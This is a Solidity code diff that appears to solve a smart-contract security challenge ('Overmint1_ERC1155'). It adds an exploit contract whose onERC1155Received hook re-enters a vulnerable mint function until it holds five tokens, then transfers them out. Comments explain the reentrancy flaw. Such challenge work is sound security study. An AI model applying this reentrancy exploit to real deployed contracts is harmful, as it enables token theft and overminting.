@@ -25,6 +25,8 @@ contract Overmint1_ERC1155 is ERC1155 {
     }
 }
 
+//ERC1155Holder implements the required `supportsInterface`, `onERC1155Received`,
+//and `onERC1155BatchReceived` functions. We can override `onERC1155Received` in the exploit.
 contract ExploitContract is ERC1155Holder {
     Overmint1_ERC1155 public overmint1_ERC1155;
 
@@ -32,5 +34,35 @@ contract ExploitContract is ERC1155Holder {
         overmint1_ERC1155 = _overmint1_ERC1155;
     }
 
-    function attack() public {}
+    //The `mint` function of the target contract is vulnerable to reentrancy.
+    //The amountMinted is not updated correctly before `_mint` is called, which hands
+    //control to the receiving contract through `onERC1155Received`. (same mechanism as ERC721).
+    //This means we can call `mint` multiple times, and the `amountMinted` will not be updated.
+    function attack() public {
+        overmint1_ERC1155.mint(0, "");
+    }
+
+    function complete() public {
+        overmint1_ERC1155.safeTransferFrom(address(this), msg.sender, 0, 5, "");
+    }
+
+    function onERC1155Received(
+        address, /*operator*/
+        address, /*from*/
+        uint256, /*id*/
+        uint256, /*value*/
+        bytes memory /*data*/
+    )
+        public
+        virtual
+        override
+        returns (bytes4)
+    {
+        //Reenter victim contract.
+        //To complete, we need exactly 5 tokens
+        if (overmint1_ERC1155.balanceOf(address(this), 0) != 5) {
+            overmint1_ERC1155.mint(0, "");
+        }
+        return this.onERC1155Received.selector;
+    }
 }
